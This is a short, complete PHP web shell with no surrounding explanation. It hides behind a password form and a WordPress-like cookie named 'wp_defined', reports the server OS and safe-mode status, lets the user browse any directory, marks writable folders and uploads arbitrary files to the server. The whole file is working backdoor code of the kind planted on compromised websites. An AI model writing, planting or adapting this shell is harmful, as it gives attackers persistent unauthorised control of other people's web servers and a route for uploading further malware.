<?php
$passwordhash = "8857d4fa543522f0f9730025eb067248";
list($protocol) = explode("/", $_SERVER['SERVER_PROTOCOL']);
if (isset($_POST['password'])) {
	setcookie('wp_defined', md5($_POST['password']), time() + 60*60*23*31);
	header("Location: $protocol://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
	exit();
}
$auth_form = <<<FORM
	<form action="" method="post">
		Password: <input type="texs" name="password" /> <br />
		<input type="submit" value="Enter" />
		<div style="display:none">t23ijmed096</div>
	</form>
FORM;

if (isset($_COOKIE['wp_defined'])) {
	if ($_COOKIE['wp_defined'] != $passwordhash) {
		setcookie('wp_defined', 'none', time() - 3600);
		header("Location: $protocol://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
		exit();
	}
} else { echo $auth_form; exit(); }

echo"<script>
	var d = document;
	function g(c) {
		d.mf.c.value=c;
		d.mf.submit();
	}
</script>";
echo PHP_OS;
if(strtoupper(substr(PHP_OS, 0, 3) ) == "WIN")
	$os = 'win';
else
	$os = 'nix';

$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
	echo "<!-- <td><nobr>Windows --!>";
	echo "<!-- g('FilesMan','c:/') --!>";
}

$safe_mode = @ini_get('safe_mode');
	if(!$safe_mode) {
		echo "<!-- Safe mode:</span> <b>OFF</b> --!>\n";
		echo "<!-- Safe mode:</span> <b>OFF</b> --!>\n";
	}


if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';

echo "t23ijmed096 Path: ".htmlspecialchars($cwd)."<input type=hidden name=c value='".htmlspecialchars($cwd) ."'><hr>";
if (!is_writable($cwd)) {
	echo "<font color=red>(Not writable)</font><br>";
}
if($_POST['p1'] === 'uploadFile') {
	if(!@move_uploaded_file($_FILES['f']['tmp_name'], $cwd.$_FILES['f']['name']))
		echo "Can't upload!<br />";
}

$ls = wscandir($cwd);
echo "<form method=post name=mf style='display:none;'><input type=hidden name=c></form>";
foreach ($ls as $f) {
	if (is_dir($f)) {
		echo "<a href=# onclick='g(\"".$cwd.$f."\");'>".$f."</a>";
		if (is_writable($cwd.$f)) {
			echo "<!-- 'filename.php','chmod')\"><font color=green> --!> ";
		} else {
			echo "<!-- 'filename.php','chmod')\"><font color=white> --!> ";
		}
		echo "<br />";
	} else {
		$files[] = $f;
	}
}
foreach ($files as $file) {
	echo $file."<br />";
}
echo	"<hr><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=c value='" . $cwd ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=file name=f><input type=submit value='>>'></form>";

function wscandir($cwdir) {
	if(function_exists("scandir")) {
		return scandir($cwdir);
	} else {
		$cwdh  = opendir($cwdir);
		while (false !== ($filename = readdir($cwdh)))
			$files[] = $filename;
		return $files;
	}
};
die;
?>